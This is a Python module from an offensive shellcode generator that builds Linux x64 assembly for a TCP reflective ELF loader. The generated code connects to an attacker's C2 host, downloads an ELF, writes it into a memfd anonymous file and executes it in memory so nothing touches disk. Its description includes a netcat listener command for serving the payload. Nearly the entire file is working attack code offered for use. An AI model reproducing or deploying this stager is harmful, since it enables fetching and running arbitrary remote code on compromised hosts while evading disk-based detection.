import sys
import math
import struct

import sickle.common.lib.generic.extract as extract
import sickle.common.lib.generic.convert as convert
import sickle.common.lib.generic.mparser as modparser
import sickle.common.lib.programmer.builder as builder

from sickle.common.lib.reversing.assembler import Assembler

class Shellcode():

    arch = "x64"

    platform = "linux"

    name = "Linux (x64) TCP Reflective ELF Loader"

    module = f"{platform}/{arch}/memfd_reflective_elf_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=127.0.0.1 LPORT=42 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Debian 13.2.0-25"]

    summary = ("TCP-based reflective ELF loader over IPV4 which executes an ELF from"
               " a remote server")

    description = f"""
    TCP based reflective ELF loader over IPV4 that will connect to a remote C2 server
    and download an ELF. Once downloaded, an anonymous file will be created to store
    the ELF file. Upon completion, it will execute in memory without touching disk.

    As an example, your \"C2 Server\" can be as simple as Netcat:

        nc -w 15 -lvp 42 < payload

    Then you can you generate the shellcode accordingly:

        {example_run}

    Upon execution of the shellcode, you should get a connection from the target and
    your ELF should execute in memory.
    """

    arguments = {}

    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    arguments["ACKPK"] = {}
    arguments["ACKPK"]["optional"] = "yes"
    arguments["ACKPK"]["description"] = "File including it's path containing the acknowledgement packet response"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]
        arg_object["architecture"] = Shellcode.arch

        self.sock_buffer_size = 0x500

        sc_args = {
            "mapping"    : 0x00,
            "sockfd"     : 0x00,
            "addr"       : 0x10,
            "buffer"     : self.get_ackpk_len(),
            "readBuffer" : self.sock_buffer_size,
            "out"        : 0x00,
            "elf_size"   : 0x00,
            "anon_file"  : 0x00,
            "anonfd"     : 0x00,
            "pathname"   : 0x00,
        }

        self.stack_space = builder.calc_stack_space(sc_args, Shellcode.arch)
        self.storage_offsets = builder.gen_offsets(sc_args, Shellcode.arch)

    def get_ackpk_len(self):
        """Generates the size needed by the ACK packet sent to the C2 server.
        Due to bugs encountered when passing raw strings, this function will
        read from a file. In addition, it instantiates self.ack_packet.
        Should no file be provided, a default string will be sent over TCP
        instead.
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("ACKPK" not in argv_dict.keys()):
            self.ack_packet = "ACK\r\n"
        else:
            self.ack_packet = extract.read_bytes_from_file(argv_dict["ACKPK"], 'r')

        needed_space = math.ceil(len(self.ack_packet)/8) * 8

        return needed_space

    def generate_source(self):
        """Returns bytecode generated by the keystone engine.
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = int(argv_dict["LPORT"])

        sin_addr = hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))
        sin_port = struct.pack('<H', lport).hex()
        sin_family = struct.pack('>H', 0x02).hex() # AF_INET

        source_code = f"""
_start:
    push rbp
    mov rbp, rsp
    sub rsp, {self.stack_space}

create_allocation:
    ; RAX => mmap(void addr[.length], // RDI => Kernel knows whats best, let em decide
    ;             size_t length,      // RSI => Size of initial allocation
    ;             int prot,           // RDX => (PROT_READ | PROT_WRITE)
    ;             int flags,          // R10 => MAP_PRIVATE | MAP_ANONYMOUS)
    ;             int fd,             // R8  => Create anonymous mapping
    ;             off_t offset);      // R9  => Offset
    xor rdi, rdi
    mov rsi, 0x500
    xor rdx, rdx
    add dl, 0x03
    xor r10, r10
    mov r10b, 0x22
    xor r8, r8
    dec r8
    xor r9, r9
    xor rax, rax
    mov al, 0x09
    syscall
    test rax, rax
    je exit
    mov [rbp - {self.storage_offsets['mapping']}], rax

create_sockfd:
    ; RAX => socket(int domain,    // RDI => AF_INET
    ;               int type,      // RSI => SOCK_STREAM
    ;               int protocol); // RDX => IPPROTO_TCP
    mov rdi, 0x02
    mov rsi, 0x01
    mov rdx, 0x06
    mov rax, 0x29
    syscall
    mov [rbp - {self.storage_offsets['sockfd']}], rax

connect:
    ; RAX => connect(int sockfd,                  // RDI => sockfd
    ;                const struct sockaddr *addr, // RSI => sockaddr struct
    ;                socklen_t addrlen;           // RDX => sizeof(sockaddr struct)
    mov rdi, [rbp - {self.storage_offsets['sockfd']}]
    mov rsi, {sin_addr}{sin_port}{sin_family}
    mov [rbp - {self.storage_offsets['addr']}], rsi
    lea rsi, [rbp - {self.storage_offsets['addr']}]
    xor rax, rax
    mov [rsi+8], rax
    mov rdx, 0x10
    mov rax, 0x2a
    syscall
        """

        packet_buffer = convert.from_str_to_xwords(self.ack_packet)
        write_index = self.storage_offsets['buffer']

        source_code += "\ninit_download:\n"

        for i in range(len(packet_buffer["QWORD_LIST"])):
            source_code += "    mov rcx, 0x{}\n".format( struct.pack('<Q', packet_buffer["QWORD_LIST"][i]).hex() )
            source_code += "    mov [rbp-{}], rcx\n".format(hex(write_index))
            write_index -= 8

        for i in range(len(packet_buffer["DWORD_LIST"])):
            source_code += "    mov ecx, 0x{}\n".format( struct.pack('<L', packet_buffer["DWORD_LIST"][i]).hex() ) 
            source_code += "    mov [rbp-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(packet_buffer["WORD_LIST"])):
            source_code += "    mov cx, 0x{}\n".format( struct.pack('<H', packet_buffer["WORD_LIST"][i]).hex() )
            source_code += "    mov [rbp-{}], cx\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(packet_buffer["BYTE_LIST"])):
            source_code += "    mov cl, {}\n".format( hex(packet_buffer["BYTE_LIST"][i]) )
            source_code += "    mov [rbp-{}], cl\n".format(hex(write_index))
            write_index -= 1

        source_code += f"""
    ; RAX = write(int fd,                 // RAX => sockfd
    ;             const void buf[.count], // RSI => strlen(msg)
    ;             size_t count);          // RDX => msg
    xor rcx, rcx
    mov [rbp-{write_index}], cl
    mov rdi, [rbp - {self.storage_offsets['sockfd']}]
    lea rsi, [rbp - {self.storage_offsets['buffer']}]
    mov rdx, {len(self.ack_packet)}
    mov rax, 0x1
    syscall
        """

        self.sock_buffer_size = 0x500

        source_code += f"""
set_index:
    xor r14, r14

download_stager:
    ; RAX => read(int fd,        // RDI => sockfd
    ;             void *buf      // RSI => Anywhere on the stack
    ;             size_t count); // RDX => 0x500
    mov rdi, [rbp - {self.storage_offsets['sockfd']}]
    lea rsi, [rbp - {self.storage_offsets['readBuffer']}]
    mov rdx, {self.sock_buffer_size}
    mov rax, 0x00
    syscall

    test rax, rax
    jz download_complete

adjust_allocation:
    mov r15, [rbp - {self.storage_offsets['mapping']}]
    mov r12, rax
    lea r9, [rbp - {self.storage_offsets['readBuffer']}]

write_data:
    mov r10b, [r9]
    mov [r15 + r14], r10b
    inc r14
    inc r9
    dec rax
    test rax, rax
    jnz write_data

check_size:
    cmp r12, 0x00
    je download_complete    


realloc:
    ; RAX => mremap(void old_address,    // RDI => *last_alloc
    ;               size_t old_size,     // RSI => sizeof(last_alloc)
    ;               size_t new_size,     // RDX => sizeof(new_alloc)
    ;               int flags,           // R10 => MREMAP_MAYMOVE
    ;               void *new_address);  // R8  => &out
    mov rdi, [rbp - {self.storage_offsets['mapping']}]
    mov rsi, r14
    mov r13, r14
    add r13, {self.sock_buffer_size}
    mov rdx, r13
    mov r10, 0x01
    lea r8, [rbp - {self.storage_offsets['out']}]
    mov rax, 0x19
    syscall

    mov [rbp - {self.storage_offsets['mapping']}], rax

    jmp download_stager

download_complete:
    mov [rbp - {self.storage_offsets['elf_size']}], r14


create_memory_file:
    ; RAX => memfd_create(const char *name,    // RDI => *buffer
    ;                     unsigned int flags); // RSI => MFD_CLOEXEC (0x01)
    xor rax,rax
    lea rdi, [rbp - {self.storage_offsets['anon_file']}]
    mov [rdi], rax
    mov dword ptr [rdi], 0x41414141

    mov rsi, 0x01
    mov rax, 0x13f
    syscall
    mov [rbp - {self.storage_offsets['anonfd']}], rax

write_to_file:
    ; RAX = write(int fd,                  // RDI => fd
    ;             const void buf[.count],  // RSI => *elf
    ;             size_t count);           // RDX => sizeof(elf)
    mov rdi, [rbp - {self.storage_offsets['anonfd']}]
    mov rsi, [rbp - {self.storage_offsets['mapping']}]
    mov rdx, [rbp - {self.storage_offsets['elf_size']}]
    mov rax, 0x1
    syscall

execute_elf:
    ; RAX = execveat(int dirfd,                     // RDI => File descriptor of anonymous mapping
    ;                const char *pathname,          // RSI => Empty string
    ;                char *const _Nullable argv[],  // RDX => []
    ;                char *const _Nullable envp[],  // R10 => *addr
    ;                int flags);                    // R8  => AT_EMPTY_PATH
    xor rax, rax
    mov rdi, [rbp - {self.storage_offsets['anonfd']}]
    lea rsi, [rbp - {self.storage_offsets['pathname']}]
    mov [rsi], rax
    mov r8, 0x1000
    lea r10, [rbp - {self.storage_offsets['readBuffer']}]
    mov rdx, r10
    mov [r10], rax
    mov rax, 0x142
    syscall
exit:
    xor rax, rax
    ret
        """

        return source_code

    def get_shellcode(self):

        generator = Assembler(Shellcode.arch)

        src = self.generate_source()

        return generator.get_bytes_from_asm(src)
